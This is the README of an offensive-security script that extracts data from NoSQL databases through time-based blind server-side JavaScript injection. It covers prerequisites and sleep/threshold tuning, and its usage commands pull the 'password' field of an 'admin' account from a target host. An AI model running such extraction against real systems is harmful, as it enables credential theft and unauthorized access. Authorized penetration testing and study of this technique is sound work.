
# What are the use cases for this script ? 

Script helps to exploit time based Server-side JavaScript code injection in NoSQL databases.
Peresiquites are: 

1) Confirmation that application is injectable 
2) Name of field to be extracted 
3) Valid username or other anchor 

Structure of NoSQL queries are not as strict as in MySQL so there might be a need of making adjustments in 
query itself before using this script.

For more information on enumerating fieldnames and field values can be found in following article 
https://portswigger.net/web-security/nosql-injection

## Configuring Treshold and sleep 

This values must be always customized to the target. Threshold determines where sleep vaule (True) was triggered in payload.  If the payload evaluates to a False condition (no sleep), the response takes approximately 1 second — set the sleep value high enough to safely distinguish True from False. In that case, setting sleep to 3 seconds and treshold to 3 seems like right choice.

## Requirements

- Python 3.7+
- `requests` library (`pip install -r requirements.txt`, run from repo root)

## Usage

```bash
# basic: extract a field for a known username
python NoSQL-SSJI-time-based-blind.py -H target.com:3000 -u admin -f password

# HTTPS target, custom endpoint
python NoSQL-SSJI-time-based-blind.py -H target.com:3000 -u admin -f password --proto https --endpoint /api/login

# route through Burp Proxy for traffic inspection
python NoSQL-SSJI-time-based-blind.py -H target.com:3000 -u admin -f password --use-proxy --proxy http://127.0.0.1:8080

# tune sleep/threshold for a slow or unreliable target
python NoSQL-SSJI-time-based-blind.py -H target.com:8080 -u user -f secret --sleep-time 2000 --threshold 2.0

# full option list
python NoSQL-SSJI-time-based-blind.py -h
```

For license and usage disclaimer, see the main repository README.